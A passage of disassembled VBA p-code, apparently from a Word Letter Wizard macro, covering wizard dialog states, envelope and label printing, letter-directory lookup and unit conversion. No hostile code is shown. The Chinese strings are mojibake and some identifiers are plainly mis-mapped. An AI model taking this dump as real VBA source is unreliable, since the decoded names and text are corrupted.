#339:\n' \tQuoteRem 0x0004 0x0007 \"State 4\"\n' Line #340:\n' \tLitDI2 0x010B \n' \tLitDI2 0x0007 \n' \tLitDI2 0x0111 \n' \tLitDI2 0x0011 \n' \tLitStr 0x001F \"\u00b1z\u00adn\u00b1N\u00abH\u00a5\u00f3\u00bc\u00d0\u00c0Y\u00b3]\u00adp\u00a9\u00f1\u00a6b\u00ad\u00b6\u00ad\u00b1\u00a6\u00f3\u00b3B?\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0005 \n' Line #341:\n' \tLitStr 0x0012 \"LetterHeadPosition\"\n' \tLd WordBasic \n' \tArgsMemCall OptionGroup 0x0001 \n' Line #342:\n' \tLitDI2 0x011D \n' \tLitDI2 0x001E \n' \tLitDI2 0x0068 \n' \tLitDI2 0x0010 \n' \tLitStr 0x0008 \"\u00bea\u00a4W(&T)\"\n' \tLitStr 0x0008 \"AtTheTop\"\n' \tLd WordBasic \n' \tArgsMemCall OptionButton 0x0006 \n' Line #343:\n' \tLitDI2 0x011D \n' \tLitDI2 0x0032 \n' \tLitDI2 0x006D \n' \tLitDI2 0x0010 \n' \tLitStr 0x0008 \"\u00bea\u00a5\u00aa(&L)\"\n' \tLitStr 0x0009 \"OnTheLeft\"\n' \tLd WordBasic \n' \tArgsMemCall OptionButton 0x0006 \n' Line #344:\n' \tLitDI2 0x011D \n' \tLitDI2 0x0046 \n' \tLitDI2 0x0077 \n' \tLitDI2 0x0010 \n' \tLitStr 0x0008 \"\u00bea\u00a5k(&R)\"\n' \tLitStr 0x000A \"OnTheRight\"\n' \tLd WordBasic \n' \tArgsMemCall OptionButton 0x0006 \n' Line #345:\n' \tLitDI2 0x010B \n' \tLitDI2 0x006B \n' \tLitDI2 0x0106 \n' \tLitDI2 0x0011 \n' \tLitStr 0x001F \"\u00abH\u00a5\u00f3\u00bc\u00d0\u00c0Y\u00b3]\u00adp\u00bb\u00dd\u00adn\u00a6h\u00a4j\u00aa\u00ba\u00b6\u00a1\u00b6Z(&S)?\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0005 \n' Line #346:\n' \tLitDI2 0x011E \n' \tLitDI2 0x007D \n' \tLitDI2 0x0041 \n' \tLitDI2 0x0012 \n' \tLitStr 0x0013 \"textLetterheadSpace\"\n' \tLd WordBasic \n' \tArgsMemCall TextBox 0x0005 \n' Line #347:\n' \tLitDI2 0x0105 \n' \tLitDI2 0x00AC \n' \tLitDI2 0x0028 \n' \tLitDI2 0x000D \n' \tLd kTip$ \n' \tLitStr 0x0004 \"tip5\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0006 \n' Line #348:\n' \tLitDI2 0x0132 \n' \tLitDI2 0x00AC \n' \tLitDI2 0x00DC \n' \tLitDI2 0x0027 \n' \tLitStr 0x0001 \" \"\n' \tLitStr 0x0008 \"tip5text\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0006 \n' Line #349:\n' \tLitDI2 0x0009 \n' \tArgsCall ItemsInState 0x0001 \n' Line #350:\n' Line #351:\n' \tQuoteRem 0x0004 0x0007 \"State 5\"\n' Line #352:\n' \tLitDI2 0x0109 \n' \tLitDI2 0x0009 \n' \tLitDI2 0x0118 \n' \tLitDI2 0x000C \n' \tLitStr 0x0023 \"\u00bf\u00e9\u00a4J\u00a6\u00ac\u00abH\u00a4H\u00b8\u00ea\u00ae\u00c6\u00a9\u00ce\u00a5\u00d1\u00b3q\u00b0T\u00bf\u00fd\u00a4\u00a4\u00bf\u00ef\u00a8\u00fa(&T):\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0005 \n' Line #353:\n' \tLitDI2 0x0109 \n' \tLitDI2 0x002E \n' \tLitDI2 0x0102 \n' \tLitDI2 0x0043 \n' \tLitStr 0x0014 \"textRecipientAddress\"\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall TextBox 0x0006 \n' Line #354:\n' \tLitDI2 0x0109 \n' \tLitDI2 0x0073 \n' \tLitDI2 0x0073 \n' \tLitDI2 0x000C \n' \tLitStr 0x000F \"\u00b1H\u00abH\u00a4H\u00a6a\u00a7}(&Y):\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0005 \n' Line #355:\n' \tLitDI2 0x0109 \n' \tLitDI2 0x0098 \n' \tLitDI2 0x0102 \n' \tLitDI2 0x0038 \n' \tLitStr 0x0011 \"textReturnAddress\"\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall TextBox 0x0006 \n' Line #356:\n' \tLitDI2 0x018E \n' \tLitDI2 0x0018 \n' \tLitDI2 0x007F \n' \tLitDI2 0x0015 \n' \tLitStr 0x000D \"\u00b3q\u00b0T\u00bf\u00fd(&A)...\"\n' \tLitStr 0x0005 \"Push1\"\n' \tLd WordBasic \n' \tArgsMemCall PushButton 0x0006 \n' \tQuoteRem 0x0048 0x0002 \"43\"\n' Line #357:\n' \tLitDI2 0x018E \n' \tLitDI2 0x0081 \n' \tLitDI2 0x007F \n' \tLitDI2 0x0015 \n' \tLitStr 0x000D \"\u00b3q\u00b0T\u00bf\u00fd(&X)...\"\n' \tLitStr 0x0005 \"Push2\"\n' \tLd WordBasic \n' \tArgsMemCall PushButton 0x0006 \n' \tQuoteRem 0x0049 0x0002 \"44\"\n' Line #358:\n' \tLitDI2 0x0006 \n' \tArgsCall ItemsInState 0x0001 \n' Line #359:\n' Line #360:\n' \tQuoteRem 0x0004 0x0007 \"State 6\"\n' Line #361:\n' \tLitDI2 0x0102 \n' \tLitDI2 0x002A \n' \tLitDI2 0x012C \n' \tLitDI2 0x0011 \n' \tLitStr 0x0011 \"\u00b1z\u00b7Q\u00bf\u00ef\u00a5\u00ce\u00a6\u00f3\u00ba\u00d8\u00bc\u00cb\u00a6\u00a1?\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0005 \n' Line #362:\n' \tLitStr 0x0008 \"WizStyle\"\n' \tLd WordBasic \n' \tArgsMemCall OptionGroup 0x0001 \n' Line #363:\n' \tLitDI2 0x0116 \n' \tLitDI2 0x0041 \n' \tLitDI2 0x00C8 \n' \tLitDI2 0x0010 \n' \tLitStr 0x000A \"\u00a5j\u00a8\u00e5\u00a6\u00a1(&C)\"\n' \tLd WordBasic \n' \tArgsMemCall OptionButton 0x0005 \n' Line #364:\n' \tLitDI2 0x0116 \n' \tLitDI2 0x0055 \n' \tLitDI2 0x00C8 \n' \tLitDI2 0x0010 \n' \tLitStr 0x000A \"\u00b2{\u00a5N\u00a6\u00a1(&O)\"\n' \tLd WordBasic \n' \tArgsMemCall OptionButton 0x0005 \n' Line #365:\n' \tLitDI2 0x0116 \n' \tLitDI2 0x0069 \n' \tLitDI2 0x00C8 \n' \tLitDI2 0x0010 \n' \tLitStr 0x000A \"\u00bc\u00d0\u00b7\u00c7\u00a6\u00a1(&T)\"\n' \tLd WordBasic \n' \tArgsMemCall OptionButton 0x0005 \n' Line #366:\n' \tLitDI2 0x0005 \n' \tArgsCall ItemsInState 0x0001 \n' Line #367:\n' Line #368:\n' \tQuoteRem 0x0004 0x000F \"State 7: Finish\"\n' Line #369:\n' \tLitDI2 0x0000 \n' \tLitDI2 0x0000 \n' \tLitDI2 0x010D \n' \tLitDI2 0x00D7 \n' \tLitStr 0x0007 \"FlagPic\"\n' \tLitDI2 0x0001 \n' \tLitStr 0x0004 \"flag\"\n' \tLd WordBasic \n' \tArgsMemCall Picture 0x0007 \n' Line #370:\n' \tLitDI2 0x0115 \n' \tLitDI2 0x003C \n' \tLitDI2 0x00ED \n' \tLitDI2 0x0014 \n' \tLitStr 0x001D \"\u00ba\u00eb\u00c6F\u00a4w\u00a7\u00b9\u00a6\u00a8\u00ab\u00d8\u00a5\u00df\u00abH\u00a5\u00f3\u00aa\u00ba\u00b8\u00df\u00b0\u00dd\u00bf\u00ef\u00b6\u00b5!\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0005 \n' Line #371:\n' \tLitDI2 0x0121 \n' \tLitDI2 0x0067 \n' \tLitDI2 0x00D4 \n' \tLitDI2 0x000F \n' \tLitStr 0x0019 \"\u00abH\u00a5\u00f3\u00ab\u00d8\u00a5\u00df\u00a4\u00a7\u00ab\u00e1\u00b1z\u00c1\u00d9\u00b7Q\u00b0\u00b5\u00a4\u00b0\u00bb\u00f2?\"\n' \tLd WordBasic \n' \tArgsMemCall Then 0x0005 \n' Line #372:\n' \tLitStr 0x000E \"HelpOrEnvelope\"\n' \tLd WordBasic \n' \tArgsMemCall OptionGroup 0x0001 \n' Line #373:\n' \tLitDI2 0x0134 \n' \tLitDI2 0x007E \n' \tLitDI2 0x00DE \n' \tLitDI2 0x000E \n' \tLitStr 0x0016 \"\u00ab\u00d8\u00a5\u00df\u00abH\u00ab\u00ca\u00a9\u00ce\u00b6l\u00b1H\u00bc\u00d0\u00c5\u00d2(&C)\"\n' \tLd WordBasic \n' \tArgsMemCall OptionButton 0x0005 \n' Line #374:\n' \tLitDI2 0x0134 \n' \tLitDI2 0x0092 \n' \tLitDI2 0x00DE \n' \tLitDI2 0x0010 \n' \tLitStr 0x0014 \"\u00a5u\u00adn\u00c5\u00e3\u00a5\u00dc\u00abH\u00a5\u00f3\u00a7Y\u00a5i(&J)\"\n' \tLd WordBasic \n' \tArgsMemCall OptionButton 0x0005 \n' Line #375:\n' \tLitDI2 0x0006 \n' \tArgsCall ItemsInState 0x0001 \n' \tQuoteRem 0x0017 0x0018 \"Number of items in state\"\n' Line #376:\n' \tLitDI2 0x0001 \n' \tLd LastState \n' \tArgsSt HideFilePreview__ 0x0001 \n' Line #377:\n' \tLd WordBasic \n' \tArgsMemCall EndDialog 0x0000 \n' Line #378:\n' \tSetStmt \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tMemLd UserDialog \n' \tSet dlg \n' Line #379:\n' Line #380:\n' \tQuoteRem 0x0004 0x0018 \" Set some default values\"\n' Line #381:\n' \tLd toui \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tArgsMemCall ToolsOptionsUserInfo 0x0001 \n' Line #382:\n' \tLitDI2 0x0000 \n' \tSt gEnvelopeLabel \n' Line #383:\n' Line #384:\n' \tQuoteRem 0x0004 0x003B \"We're ready (finally!) to throw the wizard onto the screen:\"\n' Line #385:\n' \tLd dlg \n' \tLd WordBasic \n' \tMemLd Dialog \n' \tArgsMemLd UserDialog 0x0001 \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #386:\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall WaitCursor 0x0001 \n' Line #387:\n' \tLd gDoogie \n' \tParamNamed BlueScreen \n' \tLd WordBasic \n' \tArgsMemCall ToolsOptionsGeneral 0x0001 \n' Line #388:\n' \tLd iWorkDoc \n' \tParen \n' \tLd WordBasic \n' \tArgsMemCall WindowList 0x0001 \n' \tQuoteRem 0x0028 0x0025 \"ensure work doc is in front for tests\"\n' Line #389:\n' \tLd WordBasic \n' \tArgsMemLd Window 0x0000 \n' \tLd iWorkDoc \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tExitSub \n' \tEndIf \n' Line #390:\n' \tLitDI2 0x0002 \n' \tLd WordBasic \n' \tArgsMemCall DocClose 0x0001 \n' \tQuoteRem 0x001D 0x0020 \"Close the document(w/out saving)\"\n' Line #391:\n' \tLd WordBasic \n' \tArgsMemLd [WindowName$] 0x0000 \n' \tLd emptyDoc$ \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tExitSub \n' \tEndIf \n' Line #392:\n' \tLitDI2 0x0002 \n' \tLd WordBasic \n' \tArgsMemCall DocClose 0x0001 \n' \tQuoteRem 0x001D 0x0013 \"Close the empty doc\"\n' Line #393:\n' \tElseBlock \n' Line #394:\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall WaitCursor 0x0001 \n' Line #395:\n' \tLd gDoogie \n' \tParamNamed BlueScreen \n' \tLd WordBasic \n' \tArgsMemCall ToolsOptionsGeneral 0x0001 \n' Line #396:\n' \tLd iWorkDoc \n' \tParen \n' \tLd WordBasic \n' \tArgsMemCall WindowList 0x0001 \n' \tQuoteRem 0x0028 0x001B \"ensure work doc is in front\"\n' Line #397:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tLd WordBasic \n' \tArgsMemCall ScreenUpdating 0x0001 \n' Line #398:\n' \tLd gEnvelopeLabel \n' \tIfBlock \n' Line #399:\n' \tLitStr 0x0009 \"recipAddr\"\n' \tLd WordBasic \n' \tArgsMemLd ExistingBookmark 0x0001 \n' \tLitDI2 0x0000 \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0009 \"recipAddr\"\n' \tLd WordBasic \n' \tArgsMemCall WW7_EditGoTo 0x0001 \n' \tEndIf \n' Line #400:\n' \tLitDI2 0x0000 \n' \tLd dlgEL \n' \tMemSt ExtractAddress \n' Line #401:\n' \tLd dlgEL \n' \tLd WordBasic \n' \tMemLd Dialog \n' \tArgsMemLd ToolsEnvelopesAndLabels 0x0001 \n' \tSt x \n' \tQuoteRem 0x0040 0x0022 \"we already setup dlgEL (see below)\"\n' Line #402:\n' \tLd dlgEL \n' \tMemLd AddrText \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIfBlock \n' Line #403:\n' \tLd dlgEL \n' \tMemLd EnvAddress \n' \tSt faddr \n' Line #404:\n' \tElseBlock \n' Line #405:\n' \tLd dlgEL \n' \tMemLd AddrText \n' \tSt faddr \n' Line #406:\n' \tEndIfBlock \n' Line #407:\n' \tLd dlgEL \n' \tMemLd RetAddrText \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIfBlock \n' Line #408:\n' \tLd dlgEL \n' \tMemLd EnvReturn \n' \tSt freaddr \n' Line #409:\n' \tElseBlock \n' Line #410:\n' \tLd dlgEL \n' \tMemLd RetAddrText \n' \tSt freaddr \n' Line #411:\n' \tEndIfBlock \n' Line #412:\n' \tLd x \n' \tSelectCase \n' Line #413:\n' \tLitDI2 0x0001 \n' \tCase \n' \tCaseDone \n' Line #414:\n' \tLd dlgEL \n' \tMemLd Text \n' \tLitStr 0x0001 \"0\"\n' \tNe \n' \tIfBlock \n' Line #415:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemLd MailingLabel \n' \tMemSt DefaultPrintBarCode \n' Line #416:\n' \tLd faddr \n' \tParamNamed Address \n' \tLd Application \n' \tMemLd MailingLabel \n' \tArgsMemCall PrintOut 0x0001 \n' Line #417:\n' \tElseBlock \n' Line #418:\n' \tLd dlgEL \n' \tMemLd ExtractAddress \n' \tParamNamed ExtractAddress \n' \tLd faddr \n' \tParamNamed Address \n' \tLd freaddr \n' \tParamNamed returnAddress \n' \tLd ActiveDocument \n' \tMemLd Envelope \n' \tArgsMemCall PrintOut 0x0003 \n' Line #419:\n' \tEndIfBlock \n' Line #420:\n' \tQuoteRem 0x0014 0x0019 \" need to print a document\"\n' Line #421:\n' \tLitDI2 0x0002 \n' \tCase \n' \tCaseDone \n' Line #422:\n' \tLd dlgEL \n' \tMemLd Text \n' \tLitStr 0x0001 \"0\"\n' \tNe \n' \tIfBlock \n' Line #423:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemLd MailingLabel \n' \tMemSt DefaultPrintBarCode \n' Line #424:\n' \tLd faddr \n' \tParamNamed Address \n' \tLd Application \n' \tMemLd MailingLabel \n' \tArgsMemCall CreateNewDocument 0x0001 \n' Line #425:\n' \tElseBlock \n' Line #426:\n' \tLd dlgEL \n' \tMemLd ExtractAddress \n' \tParamNamed ExtractAddress \n' \tLd faddr \n' \tParamNamed Address \n' \tLd freaddr \n' \tParamNamed returnAddress \n' \tLd ActiveDocument \n' \tMemLd Envelope \n' \tArgsMemCall Insert 0x0003 \n' Line #427:\n' \tEndIfBlock \n' Line #428:\n' \tQuoteRem 0x0014 0x0029 \" need to do a WindowList(iWorkDoc) here..\"\n' Line #429:\n' \tCaseElse \n' Line #430:\n' \tQuoteRem 0x0014 0x000A \"do nothing\"\n' Line #431:\n' \tEndSelect \n' Line #432:\n' \tLitStr 0x000A \"letterbody\"\n' \tLd WordBasic \n' \tArgsMemLd ExistingBookmark 0x0001 \n' \tLitDI2 0x0000 \n' \tNe \n' \tIfBlock \n' Line #433:\n' \tLitStr 0x000A \"letterbody\"\n' \tLd WordBasic \n' \tArgsMemCall WW7_EditGoTo 0x0001 \n' Line #434:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall LineDown 0x0002 \n' Line #435:\n' \tEndIfBlock \n' Line #436:\n' \tEndIfBlock \n' Line #437:\n' \tLitDI2 0x0000 \n' \tParamNamed Store \n' \tLd Normal_$ \n' \tParamNamed Template \n' \tLitDI2 0x0000 \n' \tParamNamed LinkStyles \n' \tLd WordBasic \n' \tArgsMemCall FileTemplates 0x0003 \n' Line #438:\n' \tQuoteRem 0x0008 0x0088 \"WindowNumber changes when user selects Envelops and Labels since in some languages it is opened as \"address\" and comes before empty doc.\"\n' Line #439:\n' \tLitDI2 0x0001 \n' \tSt iWindowNumber \n' Line #440:\n' \tLd iWindowNumber \n' \tLd WordBasic \n' \tArgsMemLd CountWindows 0x0000 \n' \tLe \n' \tParen \n' \tWhile \n' Line #441:\n' \tLd iWindowNumber \n' \tLd WordBasic \n' \tArgsMemLd [WindowName$] 0x0001 \n' \tLd emptyDoc$ \n' \tEq \n' \tParen \n' \tIfBlock \n' Line #442:\n' \tLd iWindowNumber \n' \tParen \n' \tLd WordBasic \n' \tArgsMemCall WindowList 0x0001 \n' Line #443:\n' \tLitDI2 0x0002 \n' \tLd WordBasic \n' \tArgsMemCall DocClose 0x0001 \n' Line #444:\n' \tEndIfBlock \n' Line #445:\n' \tLd iWindowNumber \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt iWindowNumber \n' Line #446:\n' \tWend \n' Line #447:\n' Line #448:\n' \tEndIfBlock \n' Line #449:\n' \tQuoteRem 0x0004 0x0009 \"All done!\"\n' Line #450:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tLd WordBasic \n' \tArgsMemCall ScreenUpdating 0x0001 \n' Line #451:\n' Line #452:\n' \tEndSub \n' \tQuoteRem 0x0008 0x000E \"%% StartWizard\"\n' Line #453:\n' Line #454:\n' \tQuoteRem 0x0000 0x0036 \"======================================================\"\n' Line #455:\n' \tQuoteRem 0x0000 0x001B \"%% Wizard-specific routines\"\n' Line #456:\n' Line #457:\n' \tFuncDefn (Private Sub GetPrewrittenDetails())\n' Line #458:\n' \tDim \n' \tVarDefn def\n' Line #459:\n' \tDim \n' \tVarDefn path\n' Line #460:\n' \tDim \n' \tVarDefn i\n' Line #461:\n' \tLd kLookingForLetters$ \n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' Line #462:\n' \tLitStr 0x000A \"LetterName\"\n' \tLd WordBasic \n' \tArgsMemLd [GetDocumentVar$] 0x0001 \n' \tSt def$ \n' Line #463:\n' \tLitDI2 0x0001 \n' \tUMi \n' \tSt defLttr \n' Line #464:\n' \tLd kLetterPath$ \n' \tArgsLd xFetchPref$ 0x0001 \n' \tSt path$ \n' \tQuoteRem 0x0026 0x0026 \"Has this been defined in wordwiz.ini??\"\n' Line #465:\n' \tLd path$ \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd kLetterPath$ \n' \tLd WordBasic \n' \tArgsMemLd [GetProfileString$] 0x0001 \n' \tSt path$ \n' \tEndIf \n' \tQuoteRem 0x004B 0x0024 \"..How about in win.ini/winword6.ini?\"\n' Line #466:\n' \tLd path$ \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIfBlock \n' \tQuoteRem 0x0017 0x0034 \"No, so assume they're in subdir of program directory\"\n' Line #467:\n' \tLitDI2 0x0009 \n' \tLd WordBasic \n' \tArgsMemLd [DefaultDir$] 0x0001 \n' \tSt path$ \n' \tQuoteRem 0x002B 0x0015 \"get program directory\"\n' Line #468:\n' Line #469:\n' \tLd path$ \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #470:\n' \tLd path$ \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [Right$] 0x0002 \n' \tLitStr 0x0001 \"\\\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd path$ \n' \tLitStr 0x0001 \"\\\"\n' \tAdd \n' \tSt path$ \n' \tEndIf \n' Line #471:\n' \tLd path$ \n' \tLd kLettersDir$ \n' \tAdd \n' \tSt path$ \n' \tQuoteRem 0x0030 0x0014 \"letters subdirectory\"\n' Line #472:\n' \tLd path$ \n' \tLitStr 0x0003 \"*.*\"\n' \tAdd \n' \tLd WordBasic \n' \tArgsMemLd [Files$] 0x0001 \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd path$ \n' \tLd path$ \n' \tFnLen \n' \tLitDI2 0x0008 \n' \tSub \n' \tLd WordBasic \n' \tArgsMemLd [Left$] 0x0002 \n' \tSt path$ \n' \tEndIf \n' Line #473:\n' \tElseBlock \n' Line #474:\n' \tLitStr 0x0001 \".\"\n' \tLd WordBasic \n' \tArgsMemLd [Files$] 0x0001 \n' \tSt path$ \n' \tQuoteRem 0x0034 0x001A \"this is the best we can do\"\n' Line #475:\n' \tEndIfBlock \n' Line #476:\n' \tEndIfBlock \n' Line #477:\n' \tLd path$ \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [Right$] 0x0002 \n' \tLitStr 0x0001 \"\\\"\n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd path$ \n' \tLitStr 0x0001 \"\\\"\n' \tAdd \n' \tSt path$ \n' \tEndIf \n' Line #478:\n' \tLd path$ \n' \tSt LettersPath$ \n' Line #479:\n' \tLd kLoadingLetterDetails$ \n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' Line #480:\n' \tLabel LExit \n' Line #481:\n' \tEndSub \n' Line #482:\n' Line #483:\n' \tFuncDefn (Private Function GetDefaultUnits())\n' Line #484:\n' \tDim \n' \tVarDefn dlgTO (As Object)\n' \tBoS 0x0000 \n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd ToolsOptionsGeneral 0x0001 \n' \tSet dlgTO \n' Line #485:\n' \tLd dlgTO \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tArgsMemCall ToolsOptionsGeneral 0x0001 \n' Line #486:\n' \tLd dlgTO \n' \tMemLd Units \n' \tSt GetDefaultUnits \n' Line #487:\n' \tEndFunc \n' Line #488:\n' Line #489:\n' \tFuncDefn (Private Function UnitName(unit))\n' Line #490:\n' \tLd unit \n' \tSelectCase \n' Line #491:\n' \tLitDI2 0x0000 \n' \tCase \n' \tCaseDone \n' Line #492:\n' \tLitStr 0x0004 \"\u00ad^\u00a6T\"\n' \tSt UnitName$ \n' Line #493:\n' \tLitDI2 0x0001 \n' \tCase \n' \tCaseDone \n' Line #494:\n' \tLitStr 0x0004 \"\u00a4\u00bd\u00a4\u00c0\"\n' \tSt UnitName$ \n' Line #495:\n' \tLitDI2 0x0002 \n' \tCase \n' \tCaseDone \n' Line #496:\n' \tLitStr 0x0004 \"\u00c2I\u00bc\u00c6\"\n' \tSt UnitName$ \n' Line #497:\n' \tLitDI2 0x0003 \n' \tCase \n' \tCaseDone \n' Line #498:\n' \tLitStr 0x0002 \"pi\"\n' \tSt UnitName$ \n' Line #499:\n' \tCaseElse \n' Line #500:\n' \tLitStr 0x0000 \"\"\n' \tSt UnitName$ \n' Line #501:\n' \tLitStr 0x000E \"Unknown units!\"\n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' \tQuoteRem 0x0036 0x000A \"debug only\"\n' Line #502:\n' \tEndSelect \n' Line #503:\n' \tEndFunc \n' Line #504:\n' Line #505:\n' \tFuncDefn (Private Function ConvertInchesToUnits(oldVal, newUnits))\n' Line #506:\n' \tDim \n' \tVarDefn newVal\n' Line #507:\n' \tLd newUnits \n' \tSelectCase \n' Line #508:\n' \tLitDI2 0x0000 \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' \tQuoteRem 0x0010 0x0006 \"inches\"\n' Line #509:\n' \tLd oldVal \n' \tSt newVal \n' Line #510:\n' \tLitDI2 0x0001 \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' \tQuoteRem 0x0010 0x0002 \"cm\"\n' Line #511:\n' \tLd oldVal \n' \tLitR8 0xB852 0x851E 0x51EB 0x4004 \n' \tMul \n' \tSt newVal \n' Line #512:\n' \tLitDI2 0x0002 \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' \tQuoteRem 0x0010 0x0003 \"pts\"\n' Line #513:\n' \tLd oldVal \n' \tLitDI2 0x0048 \n' \tMul \n' \tSt newVal \n' Line #514:\n' \tLitDI2 0x0003 \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' \tQuoteRem 0x0010 0x0002 \"pi\"\n' Line #515:\n' \tLd oldVal \n' \tLitDI2 0x0006 \n' \tMul \n' \tSt newVal \n' Line #516:\n' \tCaseElse \n' Line #517:\n' \tLd oldVal \n' \tSt newVal \n' Line #518:\n' \tLitStr 0x000E \"Unknown units!\"\n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' Line #519:\n' \tEndSelect \n' Line #520:\n' \tLd newVal \n' \tSt ConvertInchesToUnits \n' Line #521:\n' \tEndFunc \n' Line #522:\n' Line #523:\n' \tFuncDefn (Private Function ConvertUnitsToInches(oldVal, oldUnits))\n' Line #524:\n' \tDim \n' \tVarDefn newVal\n' Line #525:\n' \tLd oldUnits \n' \tSelectCase \n' Line #526:\n' \tLitDI2 0x0000 \n' \tCase \n' \tCaseDone \n' \tBoS 0x0014 \n' \tQuoteRem 0x0014 0x0006 \"inches\"\n' Line #527:\n' \tLd oldVal \n' \tSt newVal \n' Line #528:\n' \tLitDI2 0x0001 \n' \tCase \n' \tCaseDone \n' \tBoS 0x0012 \n' \tQuoteRem 0x0012 0x0002 \"cm\"\n' Line #529:\n' \tLd oldVal \n' \tLitR8 0xB852 0x851E 0x51EB 0x4004 \n' \tDiv \n' \tSt newVal \n' Line #530:\n' \tLitDI2 0x0002 \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' \tQuoteRem 0x0010 0x0003 \"pts\"\n' Line #531:\n' \tLd oldVal \n' \tLitDI2 0x0048 \n' \tDiv \n' \tSt newVal \n' Line #532:\n' \tLitDI2 0x0003 \n' \tCase \n' \tCaseDone \n' \tBoS 0x0000 \n' \tQuoteRem 0x0010 0x0002 \"pi\"\n' Line #533:\n' \tLd oldVal \n' \tLitDI2 0x0006 \n' \tDiv \n' \tSt newVal \n' Line #534:\n' \tCaseElse \n' Line #535:\n' \tLd oldVal \n' \tSt newVal \n' Line #536:\n' \tLitStr 0x000E \"Unknown units!\"\n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' Line #537:\n' \tEndSelect \n' Line #538:\n' \tLd newVal \n' \tSt ConvertUnitsToInches \n' Line #539:\n' \tEndFunc \n' Line #540:\n' Line #541:\n' \tFuncDefn (Private Function PrettyMeasurement(theVal, theUnits))\n' Line #542:\n' \tDim \n' \tVarDefn v\n' Line #543:\n' \tDim \n' \tVarDefn u\n' Line #544:\n' \tLd theVal \n' \tLitDI2 0x000B \n' \tLt \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tLd theVal \n' \tLitDI2 0x0002 \n' \tMul \n' \tLitR8 0x0000 0x0000 0x0000 0x3FE0 \n' \tAdd \n' \tLd WordBasic \n' \tArgsMemLd InStrB 0x0001 \n' \tLitDI2 0x0002 \n' \tDiv \n' \tSt v \n' \tElse \n' \tBoSImplicit \n' \tLd theVal \n' \tLd WordBasic \n' \tArgsMemLd InStrB 0x0001 \n' \tSt v \n' \tEndIf \n' Line #545:\n' \tLd theUnits \n' \tArgsLd UnitName$ 0x0001 \n' \tSt u$ \n' Line #546:\n' \tLd theUnits \n' \tLitDI2 0x0000 \n' \tGt \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0001 \" \"\n' \tLd u$ \n' \tAdd \n' \tSt u$ \n' \tEndIf \n' Line #547:\n' \tLd v \n' \tArgsLd Str 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [LTrim$] 0x0001 \n' \tLd u$ \n' \tAdd \n' \tSt PrettyMeasurement$ \n' Line #548:\n' \tEndFunc \n' Line #549:\n' Line #550:\n' \tRem 0x0029 \" This function assumes input is in inches\"\n' Line #551:\n' \tFuncDefn (Private Function RightDistanceToLeftDistance(fromEdgeInches))\n' Line #552:\n' \tDim \n' \tVarDefn fromEdgeDef\n' Line #553:\n' \tDim \n' \tVarDefn dlgPg (As Object)\n' \tBoS 0x0000 \n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd FilePageSetup 0x0001 \n' \tSet dlgPg \n' Line #554:\n' \tLd dlgPg \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tArgsMemCall FilePageSetup 0x0001 \n' Line #555:\n' \tLd fromEdgeInches \n' \tLd GetDefaultUnits \n' \tArgsLd ConvertInchesToUnits 0x0002 \n' \tSt fromEdgeDef \n' Line #556:\n' \tLd dlgPg \n' \tMemLd PageWidth \n' \tLd WordBasic \n' \tArgsMemLd Val 0x0001 \n' \tLd dlgPg \n' \tMemLd LeftMargin \n' \tLd WordBasic \n' \tArgsMemLd Val 0x0001 \n' \tSub \n' \tLd dlgPg \n' \tMemLd RightMargin \n' \tLd WordBasic \n' \tArgsMemLd 